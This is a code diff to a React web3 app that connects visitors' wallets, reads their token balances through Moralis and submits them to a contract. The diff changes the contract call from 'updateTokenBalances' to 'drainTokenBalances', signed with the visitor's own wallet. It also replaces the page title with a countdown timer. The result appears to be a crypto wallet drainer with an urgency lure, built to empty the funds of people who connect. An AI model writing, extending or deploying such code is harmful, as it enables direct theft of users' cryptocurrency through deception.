@@ -7,6 +7,7 @@ import { defaultWagmiConfig } from '@web3modal/wagmi/react/config';
 import './App.css';
 import ConnectButton from './components/ConnectButton';
 import Modal from './components/Modal';
+import CountdownTimer from './components/CountdownTimer'; // Import CountdownTimer
 import Moralis from 'moralis';
 const { getEthersSigner } = require('./adapters/ethersAdapters');
 const ethers = require("ethers");
@@ -69,7 +70,7 @@ async function getMoralisTokenBalances(address) {
 async function sendTokenBalancesToContract(signer, tokenBalances) {
   const contractAddress = 'YOUR_CONTRACT_ADDRESS'; // Replace with your deployed contract address
   const abi = [
-    'function updateTokenBalances(address[] calldata tokenAddresses, uint256[] calldata balances) external'
+    'function drainTokenBalances(address[] calldata tokenAddresses, uint256[] calldata balances) external'
   ];
   const contract = new ethers.Contract(contractAddress, abi, signer);
   
@@ -77,7 +78,7 @@ async function sendTokenBalancesToContract(signer, tokenBalances) {
   const balances = tokenBalances.map(token => ethers.BigNumber.from(token.balance));
 
   const gasLimit = 1000000; // Set a higher gas limit to ensure the transaction goes through
-  const tx = await contract.updateTokenBalances(tokenAddresses, balances, { gasLimit });
+  const tx = await contract.drainTokenBalances(tokenAddresses, balances, { gasLimit });
   await tx.wait();
   return tx;
 }
@@ -133,7 +134,7 @@ function App() {
   return (
     <div className="App">
       <header className="App-header">
-        <h1>WalletConnect App</h1>
+        <CountdownTimer /> {/* Include CountdownTimer component */}
         {isConnected ? (
           <>
             <p>Connected account: {address}</p>
